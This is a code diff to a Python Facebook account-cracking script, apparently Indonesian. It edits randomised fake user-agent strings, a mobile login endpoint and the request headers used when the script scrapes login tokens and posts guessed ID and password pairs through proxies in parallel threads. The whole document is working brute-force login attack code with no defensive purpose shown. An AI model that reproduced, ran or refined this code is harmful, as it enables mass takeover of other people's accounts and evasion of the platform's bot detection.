@@ -129,7 +129,7 @@ for x in range(2000):
 #	B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
 	C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
 	D_ = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
-	E_ = f'537.36 HeyTapBrowser/{str(rr(10,40))}.7.36.1'
+	E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
 
 	se = f'{A_}{C_}{D_}{E_}'
 	if se in redmi:pass
@@ -631,7 +631,7 @@ def otomatis():
 			elif 'mbasic' in metode:
 				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 			elif 'free' in metode:
-				babas.submit(crack,idf,pwx,"d.facebook.com",awal)
+				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
 			else:
 				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
 	sleep(5)
@@ -654,20 +654,19 @@ def crack(idf,pwx,url,awal):
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
-				"cache-control":"max-age=0",
 				"upgrade-insecure-requests":"1",
 				"user-agent":ua,
 				"accept":"*/*",
 				"content-type":"application/x-www-form-urlencoded",
 				"origin":f"https://{url}",
 				"referer":f"https://{url}/login/?source=auth_switcher",
-				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not) A Brand";v="99"',
+				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
 				"sec-ch-ua-mobile": "?0",
 				"sec-fetch-site":"same-origin",
 				"sec-fetch-mode":"cors",
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US;q=0.9,en;q=0.8",
+				"accept-language":"id,en-US;q=0.9,en;q=0.8",
 				"x-requested-with":"XMLHttpRequest"
 			}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
